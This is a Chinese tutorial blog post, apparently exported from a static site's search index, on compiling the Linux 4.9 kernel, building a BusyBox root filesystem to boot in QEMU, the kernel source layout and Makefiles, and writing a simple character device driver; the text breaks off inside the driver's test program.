<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Linux 内核开发</title>
      <link href="2021/11/19/linux-kernel/"/>
      <url>2021/11/19/linux-kernel/</url>
      
        <content type="html"><![CDATA[<h2 id="01-编译Linux4-9内核并运行">01 编译Linux4.9内核并运行</h2><p><a href="https://mirrors.edge.kernel.org/pub/linux/kernel">Linux 源码下载</a></p><p><a href="https://www.kernel.org/doc/html/latest/translations/zh_CN/index.html">Kernel Documentation</a></p><h3 id="编译内核">编译内核</h3><ol><li><p>指定硬件体系架构</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">ARCH</span><span class="token operator">=</span>x86<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果要编译arm的内核，则指定ARCH=arm且需要安装交叉编译器</p></li><li><p>配置board config</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> x86_64_defconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>配置内核</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> menuconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211031-LinuxConfigurationMenu.png" alt="Linux配置菜单"></p><p>这一步是对第2步的菜单进行微调，我们需要内核支持ramdisk驱动，需要选中如下配置：</p><pre class="line-numbers language-none"><code class="language-none">General setup  ---&gt;[*] Initial RAM filesystem and RAM disk (initramfs/initrd) supportDevice Drivers  ---&gt;  [*] Block devices  ---&gt;&lt;*&gt;   RAM block device support(65536) Default RAM disk size (kbytes)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>报错</strong>：curses.h：No such file or directory（<code>apt-get install libncurses5-dev libncursesw5-dev</code>）</p></li><li><p>编译内核</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编译成功后的内核位于：arch/x86_64/boot/bzImage</p><blockquote><p><strong>vmlinux</strong>：是内核源码编译出来的原始ELF格式文件，未经压缩。用于kernel-debug，产生system.map符号表，不能用于直接加载，不可以作为启动内核，只是启动过程中的中间媒体</p><p><strong>bzImage</strong>：是压缩的内核镜像文件，bz表示"big zImage"，两者的不同之处在于zImage解压缩内核到低端内存（第一个640K），bzImage解压缩内核到高端内存（1M以上）。如果内核比较大应该用bzImage，比zImage有更高的压缩率</p></blockquote></li><li><p>交叉编译器</p><p>交叉编译工具链的命名规则一般为：<code>$arch [-$vendor] -$os [-[gnu][eabi][hf]]-gcc</code></p><ul><li>arch：体系架构，不可省略</li><li>vendor：工具链提供商，可省略</li><li>os：目标操作系统，不可省略</li><li>eabi：嵌入式应用二进制接口（Embedded Application Binary Interface），可选的参数包括：<ul><li>abi：二进制应用接口</li><li>eabi：嵌入式二进制应用接口，主要针对嵌入式平台</li><li>gnu：表示编译器使用gnu glibc库</li><li>el：表示使用软浮点处理单元（softfp）</li><li>hf：表示使用硬件浮点处理单元（hard）</li></ul></li></ul><p>例如：</p><ul><li>arm-linux-gcc：针对arm的linux的交叉编译器</li><li>arm-linux-gnueabi-gcc：针对arm的linux的交叉编译器，使用gnu glibc库</li></ul></li></ol><h3 id="编译文件系统">编译文件系统</h3><p><a href="https://busybox.net/downloads/">buysbox源码下载</a></p><ol><li><p>配置buysbox源码</p><p>busybox配置为静态编译，busybox在运行的时候就不需要额外的动态链接库</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> menuconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">Busybox Settings  ---&gt;   Build Options  ---&gt;[*] Build BusyBox as a static binary (no shared libs)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>编译和安装</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编译完成后的busybox安装在源码根目录下的_install目录</p><p><strong>报错</strong>：stime 函数未定义（<a href="https://git.busybox.net/busybox/commit/?id=d3539be8f27b8cbfdfee460fe08299158f08bcd9">Remove stime function calls</a>）</p></li><li><p>进入_install目录，补充一些必要的文件或目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> etc dev mnt proc sys tmp<span class="token function">mkdir</span> -p etc/init.d/<span class="token function">vim</span> etc/fstab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">proc/procprocdefaults00tmpfs/tmptmpfsdefaults00sysfs/syssysfsdefaults00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> etc/init.d/rcS<span class="token function">chmod</span> <span class="token number">755</span> etc/init.d/rcS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">echo -e "Welcome to tinyLinux"/bin/mount -a# 挂载etc/fstab中的文件系统echo -e "Remounting the root filesystem"mount  -o  remount,rw  /# 根文件系统从重新挂载一次mkdir -p /dev/ptsmount -t devpts devpts /dev/ptsecho /sbin/mdev &gt; /proc/sys/kernel/hotplug# 处理热插拔mdev -s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> etc/inittab<span class="token function">chmod</span> <span class="token number">755</span> etc/inittab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">::sysinit:/etc/init.d/rcS::respawn:-/bin/sh::askfirst:-/bin/sh::ctrlaltdel:/bin/umount -a -r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> dev<span class="token function">mknod</span> console c <span class="token number">5</span> <span class="token number">1</span><span class="token function">mknod</span> null c <span class="token number">1</span> <span class="token number">3</span><span class="token function">mknod</span> tty1 c <span class="token number">4</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>一个最小的、完整的可以被内核启动的文件系统就完成了</p><p><a href="https://www.cnblogs.com/schips/p/12125736.html">BusyBox 添加自定义命令/小程序</a></p></li></ol><h3 id="制作根文件系统镜像文件">制作根文件系统镜像文件</h3><ol><li><p>先制作一个空的镜像文件</p></li><li><p>然后把此镜像文件格式化为ext3格式</p></li><li><p>然后把此镜像文件挂载，并把根文件系统复制到挂载目录</p></li><li><p>卸载该镜像文件</p></li><li><p>打成gzip包</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token function">rm</span> -rf rootfs.ext3<span class="token function">rm</span> -rf fs<span class="token function">dd</span> <span class="token assign-left variable">if</span><span class="token operator">=</span>/dev/zero <span class="token assign-left variable">of</span><span class="token operator">=</span>./rootfs.ext3 <span class="token assign-left variable">bs</span><span class="token operator">=</span>1M <span class="token assign-left variable">count</span><span class="token operator">=</span><span class="token number">32</span>mkfs.ext3 rootfs.ext3<span class="token function">mkdir</span> fs<span class="token function">mount</span> -o loop rootfs.ext3 ./fs<span class="token function">cp</span> -rf ./_install/* ./fs<span class="token function">umount</span> ./fs<span class="token function">gzip</span> --best -c rootfs.ext3 <span class="token operator">&gt;</span> rootfs.img.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终生成的文件系统镜像名字为：rootfs.img.gz</p></li></ol><h3 id="启动内核和文件系统">启动内核和文件系统</h3><ol><li><p>安装qemu</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> qemu-system-x86<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>通过qemu模拟器启动编译好的内核和文件系统镜像</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-system-x86_64 -kernel ./linux-4.9.229/arch/x86_64/boot/bzImage  -initrd ./busybox-1.30.0/rootfs.img.gz -append <span class="token string">"root=/dev/ram init=/linuxrc"</span> -serial file:output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211031-qemu.png" alt=""></p><blockquote><p>qemu取回鼠标 Ctrl + Alt + G</p></blockquote></li></ol><h2 id="02-Linux内核源码目录">02 Linux内核源码目录</h2><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211031-linuxkernel.png" alt="linux内核源码目录"></p><ul><li>arch：内核支持的CPU体系架构，例如arm/mach-omap1，即ti公司的soc，此soc的cpu核是ARM提供</li><li>firmware：固件相关</li><li>init：内核启动相关代码<ul><li>main.c：start_kernel() 是C语言代码入口</li><li>do_mounts*：内核启动后挂载文件系统</li></ul></li><li>drivers：驱动框架代码，例如i2c，dma， leds</li><li>fs：文件系统代码</li><li>ipc：进程通讯相关</li><li>net：网络协议栈相关</li><li>kernel：内核核心代码<ul><li>注意和arm/kernel目录的区别（arm体系相关），kernel目录会调用arm/kernel</li></ul></li><li>sound：声卡相关</li><li>crypto：加解密相关</li><li>include：内核头文件</li><li>lib：通用库</li><li>mm：内存管理相关</li></ul><h2 id="03-Linux内核源码编译过程">03 Linux内核源码编译过程</h2><ol><li><p>顶层Makefile文件</p><p>包含体系相关Makefile文件</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">SRCARCH <span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span>ARCH<span class="token punctuation">)</span> <span class="token comment">#export ARCH=x86指定</span><span class="token keyword">include</span> arch/<span class="token variable">$</span><span class="token punctuation">(</span>SRCARCH<span class="token punctuation">)</span>/Makefile<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>内核中的子目录，编译系统去子目录下递归地调用Makefile文件</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">init-y<span class="token operator">:=</span> init/drivers-y<span class="token operator">:=</span> drivers/ sound/ firmware/net-y<span class="token operator">:=</span> net/libs-y<span class="token operator">:=</span> lib/core-y<span class="token operator">:=</span> usr/virt-y<span class="token operator">:=</span> virt/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>drivers/tty</p><p>Kconfig 文件记录了 make menuconfig 时的选项</p><p>Makefile 文件是针对 drivers/tty 下所有源码的 Makefile</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">obj-<span class="token variable">$</span><span class="token punctuation">(</span>CONFIG_TTY<span class="token punctuation">)</span><span class="token operator">+=</span> tty_io.o n_tty.o tty_ioctl.o tty_ldisc.o \   tty_buffer.o tty_port.o tty_mutex.o tty_ldsem.o<span class="token comment">#CONFIG_TTY值对应Kconfig文件中的config TTY</span>obj-<span class="token variable">$</span><span class="token punctuation">(</span>CONFIG_LEGACY_PTYS<span class="token punctuation">)</span><span class="token operator">+=</span> pty.o......<span class="token comment"># obj-y 表示要编译到内核中,obj-m 表示要编译成驱动</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>每个目录编译后会生成一个 built-in.o 文件，是目录下所有 obj-y 下所有 .o 文件的链接文件，内核只需要链接这个文件即可</p></li><li><p>编译成完整内核镜像</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile"><span class="token keyword">export</span> KBUILD_LDS          <span class="token operator">:=</span> arch/<span class="token variable">$</span><span class="token punctuation">(</span>SRCARCH<span class="token punctuation">)</span>/kernel/vmlinux.lds<span class="token comment">#使用的连接脚本，告诉编译器怎么链接成最终的可执行文件</span>vmlinux-dirs<span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">patsubst</span> %/,%,<span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">filter</span> %/, <span class="token variable">$</span><span class="token punctuation">(</span>init-y<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>init-m<span class="token punctuation">)</span> \     <span class="token variable">$</span><span class="token punctuation">(</span>core-y<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>core-m<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>drivers-y<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>drivers-m<span class="token punctuation">)</span> \     <span class="token variable">$</span><span class="token punctuation">(</span>net-y<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>net-m<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>libs-y<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>libs-m<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>virt-y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#要链接的源码目录</span>vmlinux-alldirs<span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">sort</span> <span class="token variable">$</span><span class="token punctuation">(</span>vmlinux-dirs<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">patsubst</span> %/,%,<span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">filter</span> %/, \     <span class="token variable">$</span><span class="token punctuation">(</span>init-<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>core-<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>drivers-<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>net-<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>libs-<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>virt-<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>init-y<span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">patsubst</span> %/, %/built-in.o, <span class="token variable">$</span><span class="token punctuation">(</span>init-y<span class="token punctuation">)</span><span class="token punctuation">)</span>core-y<span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">patsubst</span> %/, %/built-in.o, <span class="token variable">$</span><span class="token punctuation">(</span>core-y<span class="token punctuation">)</span><span class="token punctuation">)</span>drivers-y<span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">patsubst</span> %/, %/built-in.o, <span class="token variable">$</span><span class="token punctuation">(</span>drivers-y<span class="token punctuation">)</span><span class="token punctuation">)</span>net-y<span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">patsubst</span> %/, %/built-in.o, <span class="token variable">$</span><span class="token punctuation">(</span>net-y<span class="token punctuation">)</span><span class="token punctuation">)</span>libs-y1<span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">patsubst</span> %/, %/lib.a, <span class="token variable">$</span><span class="token punctuation">(</span>libs-y<span class="token punctuation">)</span><span class="token punctuation">)</span>libs-y2<span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">patsubst</span> %/, %/built-in.o, <span class="token variable">$</span><span class="token punctuation">(</span>libs-y<span class="token punctuation">)</span><span class="token punctuation">)</span>libs-y<span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span>libs-y1<span class="token punctuation">)</span> <span class="token variable">$</span><span class="token punctuation">(</span>libs-y2<span class="token punctuation">)</span>virt-y<span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">patsubst</span> %/, %/built-in.o, <span class="token variable">$</span><span class="token punctuation">(</span>virt-y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#所有目录下的built-in.o</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="04-实现简单的字符设备驱动">04 实现简单的字符设备驱动</h2><blockquote><p>环境 ubuntu 20.04，内核版本 5.4.0-54-generic</p></blockquote><ol><li><p>编写hello驱动代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/moduleparam.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/cdev.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/fs.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/wait.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/poll.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/sched.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/slab.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">BUFFER_MAX</span>    <span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">OK</span>            <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">ERROR</span>         <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></span></span><span class="token keyword">struct</span> <span class="token class-name">cdev</span> <span class="token operator">*</span>gDev<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">file_operations</span> <span class="token operator">*</span>gFile<span class="token punctuation">;</span>dev_t  devNum<span class="token punctuation">;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> subDevNum <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">int</span> reg_major  <span class="token operator">=</span>  <span class="token number">232</span><span class="token punctuation">;</span><span class="token keyword">int</span> reg_minor <span class="token operator">=</span>   <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">;</span><span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">hello_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_EMERG<span class="token string">"hello_open\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>ssize_t <span class="token function">hello_write</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>u<span class="token punctuation">,</span> size_t s<span class="token punctuation">,</span> loff_t <span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_EMERG<span class="token string">"hello_write\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>ssize_t <span class="token function">hello_read</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>u<span class="token punctuation">,</span> size_t s<span class="token punctuation">,</span> loff_t <span class="token operator">*</span>l<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_EMERG<span class="token string">"hello_read\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">hello_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    devNum <span class="token operator">=</span> <span class="token function">MKDEV</span><span class="token punctuation">(</span>reg_major<span class="token punctuation">,</span> reg_minor<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//根据主设备号和次设备号手动生成设备号</span>    <span class="token comment">//注册到内核</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>OK <span class="token operator">==</span> <span class="token function">register_chrdev_region</span><span class="token punctuation">(</span>devNum<span class="token punctuation">,</span> subDevNum<span class="token punctuation">,</span> <span class="token string">"helloworld"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printk</span><span class="token punctuation">(</span>KERN_EMERG<span class="token string">"register_chrdev_region ok \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_EMERG<span class="token string">"register_chrdev_region error n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ERROR<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_EMERG<span class="token string">" hello driver init \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//申请结构体</span>    gDev <span class="token operator">=</span> <span class="token function">kzalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">cdev</span><span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//cdev表示字符设备</span>    gFile <span class="token operator">=</span> <span class="token function">kzalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file_operations</span><span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>    gFile<span class="token operator">-&gt;</span>open <span class="token operator">=</span> hello_open<span class="token punctuation">;</span>    gFile<span class="token operator">-&gt;</span>read <span class="token operator">=</span> hello_read<span class="token punctuation">;</span>    gFile<span class="token operator">-&gt;</span>write <span class="token operator">=</span> hello_write<span class="token punctuation">;</span>    gFile<span class="token operator">-&gt;</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">;</span>        <span class="token function">cdev_init</span><span class="token punctuation">(</span>gDev<span class="token punctuation">,</span> gFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cdev_add</span><span class="token punctuation">(</span>gDev<span class="token punctuation">,</span> devNum<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> __exit <span class="token function">hello_exit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">//驱动卸载</span>    <span class="token function">cdev_del</span><span class="token punctuation">(</span>gDev<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>devNum<span class="token punctuation">,</span> subDevNum<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">module_init</span><span class="token punctuation">(</span>hello_init<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//module_init 声明驱动的入口函数 hello_init</span><span class="token function">module_exit</span><span class="token punctuation">(</span>hello_exit<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//module_exit 声明驱动的出口函数 hello_exit</span><span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//缓存</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>编写Makefile</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile"><span class="token keyword">ifneq</span> <span class="token punctuation">(</span><span class="token variable">$</span><span class="token punctuation">(</span>KERNELRELEASE<span class="token punctuation">)</span>,<span class="token punctuation">)</span>obj-m <span class="token operator">:=</span> helloDev.o <span class="token comment">#内核编译系统进行识别</span><span class="token keyword">else</span>PWD <span class="token operator">:=</span> <span class="token variable">$</span><span class="token punctuation">(</span><span class="token keyword">shell</span> pwd<span class="token punctuation">)</span> KDIR<span class="token operator">:=</span> /lib/modules/4.4.0-31-generic/build <span class="token comment">#内核头文件的目录</span><span class="token comment">#KDIR := /lib/modules/`uname -r`/build </span><span class="token symbol">all</span><span class="token punctuation">:</span>make -C <span class="token variable">$</span><span class="token punctuation">(</span>KDIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span>PWD<span class="token punctuation">)</span> <span class="token comment">#-C进入内核目录执行</span><span class="token symbol">clean</span><span class="token punctuation">:</span>rm -rf *.o *.ko *.mod.c *.symvers *.c~ *~<span class="token keyword">endif</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>驱动不能链接和使用应用层的任何lib库，驱动需要引用内核的头文件和函数，所以编译时需指定内核源码的地址</p></li><li><p>执行make进行编译和加载hello驱动到内核</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211112-driver-test.png" alt="加载驱动并查看内核日志"></p><p>可见执行insmod的时候，驱动文件里的hello_init被调用了</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20211112-check-driver.png" alt="lsmod命令查看驱动"></p></li><li><p>编写应用程序测试hello驱动</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/select.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">DATA_NUM</span>    <span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> fd<span class="token punctuation">,</span> i<span class="token punctuation">;</span>    <span class="token keyword">int</span> r_len<span class="token punctuation">,</span> w_len<span class="token punctuation">;</span>    fd_set fdset<span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span>DATA_NUM<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"hello world"</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>DATA_NUM<span class="token punctuation">)</span><span class="token punctuation">;</span>    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/hello"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\r\n"</span><span class="token 